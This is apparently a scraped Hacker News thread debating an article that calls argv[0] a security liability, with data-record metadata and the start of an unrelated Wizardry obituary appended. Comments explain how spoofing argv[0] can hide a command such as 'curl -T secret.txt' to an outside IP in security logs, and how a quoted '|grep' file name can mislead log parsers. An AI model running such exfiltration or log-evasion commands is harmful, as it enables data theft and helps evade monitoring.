busybox doesn't do anything if it is not invoked in a certain way which relies on argv[0] being what it is today. I am not sure what you're arguing for frankly. reply Hizonner 2 hours agorootparentI'm arguing against the idea that the way argv[0] works is somehow wrong, and/or perhaps should be changed to \"more reliably\" reflect the filename of the executable that actually got loaded, because some programmer might not understand what argv[0] actually does. The article's lead argument for the \"badness\" of argv[0] seems to be, roughly paraphrased, that \"the program should already know what it is [true], and this could confuse it [Huh? No I don't really know what that means either]\". That's followed by a bunch of other stuff about other programs guessing what executable is running in a given process based on its argv[0], which is of course just deeply ignorant misuse of the value. I mean, \"the name\" of the file that got loaded isn't even necessarily either well defined, or useful under any definition. reply mariusor 1 hour agorootparentThen it looks like I'm terrible at reading comprehension today, I understood you were arguing the same thesis as OP. Apologies, again. :) reply avidiax 5 hours agoprevIt is sometimes used to allow one binary to be the symlink target of hundreds of commands. Android does this for most common shell commands. Toybox and busybox are examples of such implementations. https://github.com/landley/toybox https://en.m.wikipedia.org/wiki/BusyBox reply mistercow 4 hours agoparentAlso if you want a program to call itself, which is sometimes useful, this way lets you actually call the same program, rather than assuming the name and path. reply duped 4 hours agorootparentDon't do this - if you (reliably) want the path to the current executable there is no portable way to do it, but on Linux you need to readlink /proc/self/exe and on MacOS you call _NSGetExecutablePath. I forget the API on Windows. reply theamk 4 hours agorootparentI would not say it in such absolute way - /proc/self/exe has downsides as well. As this resolves all symlinks, so this breaks all the things that depend on argv[0], like nice help messages, python's virtualenv, name-based dispatch, and seeing if the program which was executed via symlink or not. A lot of times you know you never called chdir(), in which case I'd actually recommend executing argv[0], as this is nicest thing for admins. If you are really worried, you can use /proc/self/exe for progname and pass argv[0] as-is, but that's overkill a lot of times. reply duped 3 hours agorootparentThose are all cases where you're using argv[0] as an argument to the program where it's appropriate. Using it as the path to spawn a child process is incorrect. You're free to re-use it as an argument. I have fixed enough software that made this mistake that I'm confident to be absolute about it. It's a very easy mistake to make but it's really annoying when software makes it and someone needs to deal with it at a higher level. It's better for developers to know that argv[0] isn't the path to the executable it's what was used to invoke the executable. reply vlovich123 9 minutes agorootparentWhat’s the issue with using argv[0] as a way to spawn yourself? I don’t recall running into a lot of issues. reply mbrumlow 3 hours agorootparentprevI think you forget the exec system call’s first argument is a path to an executable, followed by an array of arguments, where arg[0] lives. I can’t find issue with exec(“/proc/self/exe”, [ program , … ). reply alerighi 29 minutes agorootparentWell, it could be for example that /proc is not mounted. A lot of software breaks for this, while really there is no need for it to be so. Also that approach only works on Linux, if you want to write a portable software what you do? reply sweetjuly 2 hours agorootparentprevNote though that both of these solutions are racy and so should not be done if \"someone symlinking really fast and swapping the binaries\" is in your threat model. Linux proc/self is safe though, just not the result from readlink. reply duped 1 hour agorootparentWell that's true, but also something that can't be addressed within a currently running process afaik. reply flohofwoe 4 hours agorootparentprevThere's also this very handy and tiny cross-platform library: https://github.com/gpakosz/whereami reply akira2501 4 hours agorootparentprevBeware TOC TOU problems when doing this. reply SoftTalker 4 hours agorootparentprevThere's no guarantee that the name and the path are still the same executable that is running, or that they even exist anymore. reply wongarsu 17 minutes agorootparentUnless you are on Windows reply wang_li 1 hour agorootparentprevIn most of the variants of exec*() there are separate arguments for the thing to be executed and the *argv[] list. Argv[0] being the executable is just a convention. In perl $ARGV[0] is the first positional parameter. In $ perl myscript.pl a b c $ARGV[0] is \"a\". reply mistercow 3 hours agorootparentprevI mean sure. All software is built on assumptions. Make sure the assumptions you’re making are appropriate in context. reply fallingsquirrel 4 hours agorootparentprevYou can do this without assuming the name by execing /proc/$PID/exe. Then you're not vulnerable to the argv[0] spoofing described in the article. (But of course since argv[0] does exist, you should set it properly and pass through your own argv[0] unchanged.) reply dpassens 4 hours agorootparentThat's not portable, though. OpenBSD, for example, doesn't have /proc. reply hnlmorg 1 hour agorootparentprevThat’s Linux only. Wouldn’t even work on macOS, which would likely be a significant number of your users. reply hi-v-rocknroll 2 hours agoparentprevcoreutils-static did this too. The advantage of shared libraries and multiple-use single static binaries is they're only loaded once. reply cubist_castle 4 hours agoparentprevI just learned that rustup/rustc/cargo etc. work like this too. I couldn't understand why the gentoo formula was symlinking the same binary to a bunch of aliases. reply alerighi 27 minutes agorootparentAnd that makes a lot of sense, especially for binaries that are statically linked (as usually are Rust binaries), since that could save a lot of disk space! reply kbolino 4 hours agorootparentprevOn my system, these are hardlinks (regular files with a link count >1 and the same inode) rather than symlinks, though I'm not sure why. reply mostthingsweb 4 hours agorootparentMaybe to avoid broken links if you move the original files? That's the main benefit of hardlinks vs symlinks in my mind at least. reply actionfromafar 4 hours agorootparentThat can also be a downside, you believe you have moved stuff but now you can have different versions of programs that don't expect that to be a possibility. reply duped 4 hours agorootparentprevclang does this too. reply layer8 3 hours agoparentprevThe article discusses this. reply travisgriggs 4 hours agoprev> “Should a program be allowed to behave differently based on its name?” I don’t see why not. It’s allowed to behave differently based on the arguments that follow it. I personally think the genericity of including the program name itself as one of its own calling arguments is really meta cool. reply SoftTalker 4 hours agoparentOne other historical reason for this (also the reason that older unix utilities tend to have such short names) is that people often interacted with unix machines over slow terminals or even paper teletypes. Typing \"rm\" instead of \"remove\" or \"reboot\" instead of \"systemctl --reboot\" was legitimately more convenient. reply Arch-TK 3 hours agorootparentI mean, it's still more convenient to type `rm` rather than `Remove-Item` when doing day-to-day computer tasks on your computer (yes I'm one of those people who lives in a terminal). It's also certainly better from a readability standpoint to have `Remove-Item` rather than `rm` in a script. Likewise, I would much rather type `ls -Al` rather than `ls --almost-all --long-listing` (N.B. --long-listing is not the long option for -l, -l has no long option, I just made up an appropriate name) when listing a directory but would probably appreciate the long form in a script. I think just like we have long options and short options, it would be helpful to have long commands and short commands. reply shermantanktop 4 hours agoparentprevIt’s the equivalent of the HTTP Host header, with similar utility. But I agree with the author that an OS provided trustable structure is a much better way. reply marcosdumay 3 hours agorootparent> an OS provided trustable structure Repeating the OP, your program takes every other parameter from the caller, why do you insist on the executable name to not be set by him too? Windows defender is the one that is stupid by using it. Every OS has the real executable name in some place, security software should look there instead. reply MPSimmons 4 hours agoparentprevIf not, then busybox is going to need to change a TON reply dataflow 4 hours agoparentprev> I don’t see why not. It’s allowed to behave differently based on the arguments that follow it. That's missing the point, I think. The real question here is, is the name of a program really an argument to the program, from the user's perspective? I certainly don't blame users that disagree. It's more difficult for them to change argv[0], and the fact that this is possible is not necessarily obvious to them, nor to their users. If it helps, think of it like this: imagine the file timestamp was similarly passed as argv[-1]. And that the file inode number was passed as argv[-2]. Would it make sense to change behavior on those too? reply jrockway 2 hours agoprevI think argv[0] is fine. It sounds like there is a lot of bad security scanning software that doesn't understand how the `exec` syscall works. That sounds like their problem and not a fundamental problem with argv[0]. Most people use argv[0] so they can do something like: $ mycommand help Type `mycommand foo bar` to foo bars. $ mycommand1.2.3 help Type `mycommand1.2.3 foo bar` to foo bars. This is admittedly less fun when mycommand is /home/jrockway/.cache/bazel/_bazel_jrockway/7f95bd5e6dcc2e75a861133ddc7aee82/execroot/_main/bazel-out/k8-fastbuild/mycommand/mycommand_/mycommand` however. reply halayli 35 minutes agoprev> This seems like a questionable design decision. Should a program be allowed to behave differently based on its name? From a 2020s standpoint, this seems highly undesirable, as it makes software less predictable and goes against modern design principles. No it doesn't make software less predictable nor does it goes against modern design principles. argv has very handy use cases and can be used to provide better user experience. Unless you have evidence to back up your claims, you're just turning a subjective opinion to an objective one without any merit. Either way, it's software developer choice and irrelevant to the user as much as it is irrelevant to the user whether the developer prefers for(;;) over while(1). reply js2 3 hours agoprev> Today however, disk space is no longer considered an issue; this is evidenced by macOS Sonoma, where shutdown and reboot are two separate executables. Try running `ls -li /usr/bin` on macOS and you might be surprised to learn that all of these are a single executable: DeRez, GetFileInfo, Rez, SetFile, SplitForks, ar, as, asa, ... yacc. There's 77 different entries in `/usr/bin` (including `git` and `python3`) that are all links to the same binary (`com.apple.dt.xcode_select.tool-shim`). It's a wrapper that implements the `xcode-select` concept to locate and run the real executable provided by either the Command Line Tools package or a particular Xcode version you may have installed. And that's not the only one. There's another 68 links starting with `binhex.pl` and ending with `zipdetails` that are a single 811 byte wrapper-script around perl. Altogether, I see that there are 26 different names that are multiply linked: ls -li /usr/binawk '{print $1}'sortuniq -csort -ngrep -v \"\\s*1\\s\"wc -l Some of the other examples: less & more, bc & dc, atrm & batch, stat & readlink. Having a program behave dynamically based on argv[0] is a useful tool in the Unix toolbox. The alternative would be compiling 77 different versions of `tool-shim,` creating 68 different versions of that perl wrapper, etc. The `git` binary uses this concept too. You can create an executable named `git-foo`, put it anywhere in your PATH, and then call it as `git foo`. In the end, argv[0] is just an argument that can be used to improve CLI ergonomics and reduce code duplication. It's not solely about disk space. I think that makes it a more common and useful concept than you give it credit for. As to the rest of the post: I'm not really sure how argv[0] being in the caller's control is any different than the rest of the execution context being in the caller's control: the remaining arguments, the environment, limits on file descriptors, which file descriptors are open, the program's real and effective uid and gid, signals it might receive and so on. These all amount to untrusted input any executable has to be cognizant of, more or less so depending upon what privileges the executable has and what its goals are. reply cryptonector 3 hours agoparentBesides, disk space is not an issue, but container image size still can be an issue because those have to be copied around the network, and it's easy to have thousands of 10GB images consume more disk space than you might have thought you'd need. reply tsujamin 53 minutes agorootparentSurely the duplication would be (mostly) compressed away? reply kelsey98765431 5 hours agoprevThis is how busybox works in 'shim' mode. I am not however concerned with the security argument here, if you have the ability to run code you have the ability to do n to the power of x insidious things, and arg[0] abuse is just one of dozens, (hundreds?) of vectors or useful building blocks in an attack. if we are suddenly giving a shit about security on nixens, we should be looking at deeper SELinux rollouts (ease of use for sysadmins and maintainers so we never see permissive mode instead of just applying the difficult to remember command that will patch your policy settings. We need root capabilities to continue to be separated in the kernel access control scheme and probably we need to start using namespaces much more liberally like projects like silverblue/bluefin which reimplement entire os stack as a series of containers. Stronger container foundations and ease of use for existing security mechanisms will take us much further than worrying about ANYTHING else in the ABI which by the way will never change as long as linus is alive, and he will live on forever as an LLM most likely with the amount of mailing list posts he has made over the years. reply theamk 4 hours agoprevThat's a weird take against argv[0] - all arguments are: \"goes against modern design principles\" and \"can confuse programs which use argv[0] when they wanted \"exec\" instead\" For the former, I don't see how this goes against modern principles - in presence of symlinks, it is pretty reasonable to want to know both \"how was this program called\", as well as \"what's the actual executable we ended up with\". And this does more than just giving multiple names to same program - for example python uses argv[0] to tell if it's inside virtualenv and adjust search paths accordingly. This makes it appear like there are multiple python installs on system, with no extra disk space taken. For the latter, yes, programs can have bugs and OSes can have non-obvious semantics, and if you are security software, it's very important to be aware about them. I would not mark \"argv[0]\" as something especially bad from security perspective. All the author's examples would still be possible in hypothetical world where argv[0] is set by system - as nothing stops user from creating a symlink in temporary dir with deceiving name (spaces and quotes are OK in filenames!) and exec'ing it directly. Instead, fix your security software so it quotes argv values? reply wietze 3 hours agoparentFrom a living-of-the-land perspective, having to symlink/hardlink/alias a command is much noisier - and thus easier to detect. So although you are right in saying it wouldn't completely solve the problem, making it a system responsibility would still significantly reduce the scope for abuse. reply dcminter 4 hours agoprevThis lost me at \"goes against modern design principles\" without citing what principle(s) the author had in mind that would proscribe it. reply st_goliath 4 hours agoparentGiven the tone and assumptions the article makes, and the things that are explicitly explained, this seems to be one of those articles where a novice learnt something new and then decided to write an article about it, despite not having fully grasped the concept yet. As a result, the author has such strange, absolute positions, calling it a legacy that should be abolished (only tangentially knowing some actual use cases), or that strange quote about design principles. Despite all the talk about security, the whole debacle that argc can be 0 (and argv[0] can be NULL), is completely left aside. This has caused actual security issues quite recently[1]. [1] https://lwn.net/Articles/882799/ reply gwbas1c 1 hour agorootparentThe security issues the author points out later in the article do have merit. Unfortunately, the author shot their credibility in the foot by perseverating on use of argv[0]; instead of glossing over it and getting to the point. reply hiccuphippo 4 hours agoparentprevI would guess the modern principle of disregard for disk space or memory usage :( reply astrobe_ 1 hour agoparentprevthe Modern principle prescribe that one should never use software that's older than yourself. Some cults even prescribe that that one should not use a framework longer than you would wear a pair of socks. reply JohnFen 4 hours agoprev> Today however, disk space is no longer considered an issue On desktop machines, perhaps, but this is certainly not true on all platforms Linux runs on. reply Suppafly 4 hours agoparentPlus the whole \"space is not an issue\" thing along with \"you can just add more ram\" is the reason everything is so bloated and slow even on well provisioned machines. reply Sohcahtoa82 2 hours agorootparentThese days, Windows Calculator takes up more memory than mIRC. Tell me why a simple calculator app needs more memory than a complete multi-server implementation of the IRC protocol (including SSL/TLS), not to mention a full scripting engine. reply Suppafly 20 minutes agorootparent>These days, Windows Calculator takes up more memory than mIRC. I'd be somewhat surprised if that's actually true, but I haven't used mirc for years (started using hexchat once I was honest about the fact that I wasn't going to pay for mirc) but I think a lot of that is an inherent part of windows development now, basic c# projects with graphics end up being pretty big. Interestingly enough, the new windows calculator is mit licensed and on github. But also it has a lot more features than most people think, it's not a 'simple calculator app', it's a full featured graphing calculator even if most people don't use those features. reply Sohcahtoa82 0 minutes agorootparent> I'd be somewhat surprised if that's actually true It 100% is. I launched Calculator and according to the Processes tab in Task Manager, \"Calculator\" is using 31.2 MB of memory, and mIRC is taking 17.2 MB. If I go to the Details tab, then the story it tells is even worse. I include several metrics here: Working Set: - Calculator: 91 MB - mIRC: 40 MB Memory (private working set): - Calculator: 30 MB - mIRC: 18 MB Memory (shared working set): - Calculator: 61 MB - mIRC: 23 MB Commit size: - Calculator: 67 MB - mIRC: 49 MB By basically every metric, mIRC uses less memory than Calculator. > it's not a 'simple calculator app', it's a full featured graphing calculator even if most people don't use those features. The only feature that should significantly impact the memory usage is the graphing. All its little measurement conversion options shouldn't take more than a few kilobytes. But even with the graphing, it's absurd that it takes more memory than the total memory I would have had in a 486 machine that could easily have run an app with the same features. > but I think a lot of that is an inherent part of windows development now, basic c# projects with graphics end up being pretty big. I suppose the price you pay for almost guaranteed memory safety and ease of development through abstractions means your base executable memory footprint includes an entire language runtime. citrin_ru 2 hours agoparentprevSSD relatively recently were not so big (compare to HDD with comparable price) and space is an issue on not so new desktops. I don't want to upgrade a notebook only because someone thinks that disk space is not an issue. But of course this much more of an issue for embedded platforms like routers with OpenWRT. reply Hizonner 3 hours agoparentprevNo, not on desktop machines either. Executables these days can be enormous. The author's just dumb. reply skobes 4 hours agoprev\"Windows’ own API calls for creating new processes (such as CreateProcess [6], ShellExecute [7]) do not allow you to set argv[0]: it sets it for you, based on how the path to the executable was provided.\" Isn't this contradicted by the docs? CreateProcess receives lpApplicationName and lpCommandLine, and they can be different. reply DSMan195276 2 hours agoparentYeah they have this incorrect. if you provide `lpApplicationName` and `lpCommandLine` then the application name is not automatically added to the command line string, you have to add it yourself to the string provided as `lpCommandLine`. I checked and the docs for `CreateProcess` briefly mention this issue: > If both lpApplicationName and lpCommandLine are non-NULL, the null-terminated string pointed to by lpApplicationName specifies the module to execute, and the null-terminated string pointed to by lpCommandLine specifies the command line. The new process can use GetCommandLine to retrieve the entire command line. Console processes written in C can use the argc and argv arguments to parse the command line. _Because argv[0] is the module name, C programmers generally repeat the module name as the first token in the command line._ reply magicalhippo 3 hours agoparentprevNot the way I understand it. In the execv documentation[1], you pass the program name twice: int execv(const char *path, char *const argv[]); The argument path points to a pathname that identifies the new process image file. The argument argv is an array of character pointers to null-terminated strings. [..] The value in argv[0] should point to a filename string that is associated with the process being started by one of the exec functions. Windows does not allow you to do that, AFAIK. [1]: https://pubs.opengroup.org/onlinepubs/9699919799/functions/e... reply skobes 2 hours agorootparent> Windows does not allow you to do that, AFAIK. It does though, using the lpCommandLine parameter to CreateProcess as I said. CreateProcess(\"main.exe\", \"foobar\", ...) argv[0] is \"foobar\" reply magicalhippo 1 hour agorootparentI stand corrected. Been ages since I used Win32 API a lot, and I realized I can't recall using both of those arguments when calling CreateProcess. reply lanstin 4 hours agoprevThis article seems to be an example of how some common security practices are kind of surface level. If you want to limit what a box can access on the network, do it in the network. Why is security looking for bad urls in the argv; if you know they are bad just block them? Or better yet if they aren't good, don't allow them. And if you want to know what a process is doing, ask the kernel to log its syscalls. If you take away argv 0 you will lose some valuable stuff (cute little busybox links, error logs that have argv[0] in them, and attackers will just name payload.exe ls.exe. And if your network is allow all, they will still reach CNC or collector end point. reply dividuum 4 hours agoparentSeriously: Their reason is basically \"argv[0] is bad because security snake oil software is garbage\": 1) Oh no, the only protection is looking at argv[0]. What kind of clown software is that? Software that notably runs on an already compromised system.. 2) No need for argv[0] to fool software that concats argv values with spaces: just run 'curl -o \"test.txt |grep\" 1.1.1.1' 3) A long argument messes up telemetry? Let's hope that bucket doesn't have more holes. reply shermantanktop 4 hours agorootparentThese are all very realistic examples. Should they happen? No, but reality is messy and imperfect. The crappy software you describe would not exist if there were great solutions in this space. reply Hizonner 3 hours agorootparentThere are better solutions than that. Off the top of my head, on Linux, you could get what the article is asking for by doing a readlink on /proc/self/exe. The crappy software exists because the people who write it don't have any idea what they're doing. And the reason for that is that the people who found companies in the security space have discovered that nobody can tell whether their products really work or not, so they can save money on talent and training. reply marcosdumay 3 hours agorootparentprevYes, they are realistic. No you shouldn't change your system to satisfy clown development dynamics. And just as a warning, if you insist on doing so, the rules will get ever more complicated. Expect to not be able to achieve anything at all very soon. reply shermantanktop 2 hours agorootparentIf Crowdstrike is an example, then that's not true. Instead, success is not gated by rule quality, and you can get to global scale without a signal as to whether your rules are actually good or effective. And then someone publishes a new template and boom, Delta grounds their planes for days. reply blenderob 4 hours agoprev> argv[0] is a relic of the past Busybox says hello. Seriously though, how is this on the front page? Both the premise and conclusions contradict the reality of how argv[0] is used with symbolic links and hard links. reply layer8 3 hours agoprevIf nothing else, argv[0] is useful for producing error messages that indicate the name of the executable that is outputting the message. It's probably a good idea to not have it settable to other values by the invoking process, as is generally the case on Windows (ignoring its Posix subsystem here). reply cryptonector 3 hours agoprevPlease no. If you want to know what a process is running, look carefully in `/proc` or use `lsof` or whatever, but no, please, `argv[0]` is super useful. I use it, lots of people use it. And it's well known that pstrings can be abused to hide things from `ps`, but so what, it's been that way for 4+ decades and it's a well-known \"problem\" (it's not a problem). reply gwbas1c 1 hour agoprevThe author's extensive criticisms of using argv[0] are a distraction from the main point of the article: Summary: By manipulating argv[0], a malicious program can hide what its doing in security logs. For example, a malicious program can make \"curl -T secret.txt 123.45.67.89\" look like \"curl localhostgrep -T secret.txt 123.45.67.89\" in security logs. A mallicious program can also use very large argv[0] values as a DOS attack on system logging; or to truncate malicious arguments. IMO, operating systems should block this practice. Unfortunately, the author's extensive criticism of programs reading argv[0] hurt the author's credibility before most people get to the real point of the article. reply josefx 5 hours agoprevMicrosoft defender using broken by design detection rules? One could almost think it is an anti virus program. reply PaulHoule 2 hours agoprevIt’s part of the shambolic world of Unix and C. But “worse is better!” A good language spec is laid out in a way that reads from front to back with minimized circularity. See Common Lisp, Java, Python, etc. As a kid in high school checking out Unix manuals and implementing many Unix tools in https://subethasoftware.com/2022/09/27/exploring-1984-os-9-o... I struggled with K&R because of the circularity of the book, which was really an anomaly built into C, the culture of C, or both because C++ books still read this way. C had so many half-baked things, such as an otherwise clean parser that required access to the symbol table. And of course a general fast and looseness which lead to the buffer overflow problem. There were other languages which failed to solve the systems programming problem like PL/I and Ada, not to mention ISO Pascal which could have tried but didn’t. (Turbo Pascal proved it could have been done.) People took until 1990 or so to be able to write good language specs consistently, so we can forgive Unix but boy is it awful if you look closely at it. On the other hand, IBM never did make a universal OS for the “universal” 360, yet Unix proved to be adaptable for almost everything. reply zabzonk 1 hour agoparenti may have missed it, but where does the C Standard say anything about access to a symbol table? or even if such a thing exists. and as for IBM i managed to use all sorts of OSs in VMs on IBM hardware back in the 1980s. Which did you have problems with? reply PaulHoule 24 minutes agorootparentThe parser in C has to keep track of the symbol table to handle cases like typdef int myint; myint x; which is unusual among programming languages. Sure I used VM on IBM hardware in the 1980s and it was great. I also used timesharing systems on the PDP-8 (what atrocious hardware!), the PDP-11 and the PDP-10/20 in the 1970s. Although the 360 was superior in so many respects (except for the slow interrupt handling) it failed to break into the huge market for general-purpose timesharing to support software development and such (learning BASIC) until the time microcomputers came along and crushed the timesharing market. (PDP-10 was famously used to develop microcomputer software such as the original Microsoft BASIC and Infocom's z-machine games) Fred Brooks' project to develop an OS for the 360 was notoriously troubled and IBM belatedly turned to VM as a dark horse. Today it looks ahead of its time (as virtualization became mainstream on x86 in the 00's) but back then IBM was flailing and they wound up with a good software story by accident. It was not really their fault, people just didn't know how to make an OS and the most advanced thinking back then was monstrosities like MULTICS. It was Unix and VAX/VMS that pointed to what a general purpose OS would look like a few years later and there has been relatively little innovation since then because nobody can afford to rearchitect the user space. (e.g. no way you can take out the \"bloat\" because you'll have to put it back in to run the software you want) IBM's z-architecture (the other z) has a great software story today (even runs Linux) but it was not the Plan A or even the Plan B. reply zabzonk 0 minutes agorootparentwell, that's like saying the compiler when it sees something like: int x; x = 1; it has to keep track of \"x\". of course it does. what programming languages don't? dotancohen 4 hours agoprevI also use argv[0] for the -h help text, to show examples how to use the command. reply st_goliath 4 hours agoparentThere is also a neat little BSD extension, also supported on a number of other Unix-like systems and GNU userspace (i.e. glibc, but also other libcs like Musl): extern char *__progname; which holds the program name without the (optional) invocation path in front of it. Basically the last path component of argv[0]. reply dotancohen 4 hours agorootparentNice, thank you. reply anonymousiam 4 hours agoparentprevI've done this too, but you should remove the path elements from the argv[0] string before you include it in your error/help messages. reply jmholla 4 hours agorootparentYou don't need to. Keeping them shows the user exactly how to call the program based on how they called it. reply patrickmay 2 hours agoparentprevSame here, as well as for showing an example invocation when the user fails to include a required argument. reply CamJN 3 hours agoprevThis is near and dear to my heart. I wanted to make a utility to get the arguments of other processes, and found after looking that every single use of the KERN_PROCARGS2 sysctl (used on macOS) on the internet is wrong (they assume argv[0] is not an empty string), including Apple's and Google's. So after making my utility I also made a library out of it, both are bsd-3, but non-gratis: https://getargv.narzt.cam/ reply CamJN 3 hours agoparentOn a related note, env vars do not have to be of the form key=value, they are arbitrary NUL-terminated byte strings just like the args. reply Dwedit 3 hours agoprevHow about the part about knowing what the directory the executable was launched from? It could be different than the working directory. reply jujube3 1 hour agoprevProblem: virus scanning software on Windows is broken. Solution: we should not use argv[0]? reply hi-v-rocknroll 2 hours agoprevArguing against legacy quirks is arguing against compatibility and arguing for throwing away decades of code portability guarantees through 20/20 hindsight perfectionism failing to consider the costs and burdens of reimagining the world with bikeshedding rants. reply tqwhite 3 hours agoprevargv[0] is a parameter. Like any user input, it should be treated skeptically. There is absolutely nothing wrong with allowing more than one way to invoke the same program. This article is simply silly. Fortunately, it will be ignored completely since acting on it would break the universe. reply Arch-TK 3 hours agoprevFor a command line utility, argv[0] is nice to see in error messages (e.g. `./tool: fatal: Could not open './file' for reading`). When the shell combines stdout and stderr, it's easier to spot exactly what you just typed as argv[0] from all the other output. For most other things, definitely unnecessary. reply keepamovin 4 hours agoprevThis is why we can't have nice things. Security footguns everywhere! I'm fascinated by the intersection of argv[0], and the execve behavior of replacing the calling program with the called one. Aside from that, I quite like argv[0], for a much more limited set of reasons than considered in this interesting and comprehensive article. I like the ability to \"retitle\" a process to put a useful, descriptive, or branded name in there to be seen by ps, et al. NodeJS also exposes this feature, but not quite as you might expect. Whereas in C, setting argv[0] from within the program's execution context will alter what is observed by ps, in NodeJS process.argv is just a descriptive getter. Setting its slots has no effect outside of its context. But this is where process.title steps in. Setting process.title allows you to (in an OS-dependent way) change the name reported in ps and similar tools. Read more here: https://nodejs.org/api/process.html#processtitle Please don't kill argv[0], its lease hath all too short a date reply kelsey98765431 4 hours agoparentYour fascination is rewarded by reading the other man sections such as section three: https://linux.die.net/man/3/execve If you already know about the additional man pages beyond user space, i cannot more strongly recommend diving into them. Additionally the gnu 'info coreutils' is a good place to start, as well as the glibc manual. reply tantalor 4 hours agoprevThe name of something is not an intrinsic property. reply barelyauser 4 hours agoparentCan something posses extrinsic properties? Or are them a intrinsic property of external things? reply samatman 2 hours agorootparentYes. Not only is there a Wikipedia article on it, there's more than one. Here's the one covering science and engineering, which is the appropriate version for this discussion. https://en.wikipedia.org/wiki/Intrinsic_and_extrinsic_proper... reply t43562 3 hours agoprevarg0 also contains the path from where the invoker invoked the binary so for me this enables all sorts of binaries that work out where their dependencies are relative to their original binary. That's extremely convenient because you can combine it with $PWD to find out the absolute path to the binary. One can then guess what the PYTHONPATH and LD_LIBRARY_PATH should be most of the time and save someone from having to set them. Obviously this is of most use when you're running something you've installed into /opt (e.g. /opt/myprog/bin, /opt/myprog/lib etc) or are running it from the source tree. reply mzs 13 minutes agoprev\"A login shell is one whose first character of argument zero is a -\" reply guappa 5 hours agoprevWait until he finds out about busybox! Also claiming that the windows API to call a new process is good… wow… I guess he's never had to pass a filename with quotes and spaces in its name. The API expects you to do the escaping yourself. Yes it needs to be escaped, because it's all one single string. reply pjc50 4 hours agoparentThere are a number of good things about CreateProcess, but argument passing is not one of them. It's a very longstanding misfeature in the design of CMD.EXE and almost certainly dates from MSDOS and therefore CP/M. A side effect of that is that programs do their own unescaping. Unix users who are used to quotes being stripped for them may be surprised by this. reply azlev 3 hours agoprevI don't think the argv was made with security in mind. If we want something to be used in security field, the design since day 0 should consider it. Trying to retrofit something will break a lot of things. reply andrewmcwatters 4 hours agoprevI wish amateurs would stop propagating the false idea that disk space and memory are cheap and not a problem. reply hinkley 3 hours agoprev> Today however, disk space is no longer considered an issue; Tell me you don’t use Docker without telling me you don’t use Docker. I’d argue the certutil problem the author mentions is a flaw in certutil, not argv’s fault. Doesn’t that mean it falls to symlinks as well? If you look at sudo, it’s generally deny by default. Rename a program all you want, you won’t get to use it unless you can overwrite a program that is in the sudoer file. So I don’t know what nonsense certutil is playing at if it’s using argv to do its job. That’s appalling. reply omphaloskeptic 4 hours agoprevAlso, on POSIX systems, exec-ing a program with argv[0] starting with ‘-‘ will have it start as a login shell, which is a whole rabbit hole of its own. I’m sure it’s within the security model (and the linked article doesn’t really discuss the concept of OS security models), but it’s still a pretty big shift in behaviour just from adding a character to the argv[0] value reply fanf2 4 hours agoparentNo, that’s a property of how shells interpret argv[0], not a property of exec() reply KingOfCoders 4 hours agoprevI use argv[0] to monitor the binary by itself and restart when it has changed. reply actionfromafar 4 hours agoparentHow? Checking and storing a checksum, or just file change metadata? reply marcosdumay 3 hours agorootparentWell, I'm not the GP , but probably with OS file change monitoring API, that changes for each OS but the maintream ones all have some. reply mannyv 4 hours agoprev\"Remember, the safest computer is one that's turned off and unplugged.\" reply gorjusborg 2 hours agoprev [–] Why bother asking? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The post highlights the security risks associated with using argv[0] to represent a process's name in command lines across operating systems.",
      "Historically intended to allow programs to behave differently based on invocation, argv[0] is now considered outdated and insecure, with potential to bypass security defenses and corrupt telemetry.",
      "Recommendations include avoiding reliance on argv[0], improving detection of its manipulation in defensive software, and excluding it from command-line reports to mitigate security issues."
    ],
    "commentSummary": [
      "The article discusses the use of `argv[0]` in programming, particularly its role in identifying how a program was called, which is crucial for tools like Busybox.",
      "There is a debate on whether `argv[0]` should be set by the operating system (OS) rather than the programmer, with arguments about security and efficiency.",
      "The discussion highlights the trade-offs between using `argv[0]`, symlinks, and shebangs, especially in resource-constrained environments like embedded systems."
    ],
    "points": 140,
    "commentCount": 158,
    "retryCount": 0,
    "time": 1725366606
  },
  {
    "id": 41431177,
    "title": "Wizardry Co-Creator Andrew Greenberg Has Passed Away",
    "originLink": "https://www.timeextension.com/news/2024/09/wizardry-co-creator-andrew-greenberg-has-passed-away",
    "originBody": "News Wizardry Wizardry Co-Creator Andrew Greenberg Has Passed Away 1981 epic laid down the foundations of the genre by Damien McFerran Yesterday, 9:45am Share: 15 Image: Digital Eclipse We're sad to report that Andrew Greenberg, who created the seminal RPG Wizardry alongside Robert Woodhead, has passed away. Released in 1981, Wizardry was one of the first RPGs for personal computers and would prove to be a huge influence on the development of the genre. It was also a massive success in Japan and continues to receive new installments in that market. More recently, the original game was remastered by Digital Eclipse for modern systems. Image: Robert Woodhead Greenberg – who lent his name to the antagonist of the first Wizardry game (Werdna is Andrew spelt backwards) – would later work as a patent attorney and general counsel for a renewable energy company. Our thoughts are with Greenberg's family and friends at this difficult time. I am saddened to learn of the passing of game designer Andrew Greenberg. I never had the pleasure of meeting Andrew in person, but his landmark role-playing game series Wizardry was a joyful and influential part of my life in the 1980s. Rest in peace, Werdna! pic.twitter.com/gIebU9FETl— David Mullich (@David_Mullich) August 30, 2024 Related Articles Review Wizardry: Proving Grounds Of The Mad Overlord (Switch) - A Grand Remake Of An Iconic Game Nintendo LifeTrebor SUX Interview \"Wizardry Just Had A Kind Of Soul\" - How Digital Eclipse Brought The RPG Classic Into The Modern-Age \"There were so many firsts with this game\" News Virtual Boy 'Wizardry' Game Revealed In Previously Unseen Pitch Document \"It's such a shame that it wasn't released\" [source x.com] Related Games Wizardry: Proving Grounds of the Mad Overlord (Switch eShop) See Also Wizardry: Proving Grounds of the Mad Overlord Review 50 Best Nintendo Switch Games To Play Right Now (2024) Share: 15 2 1",
    "commentLink": "https://news.ycombinator.com/item?id=41431177",
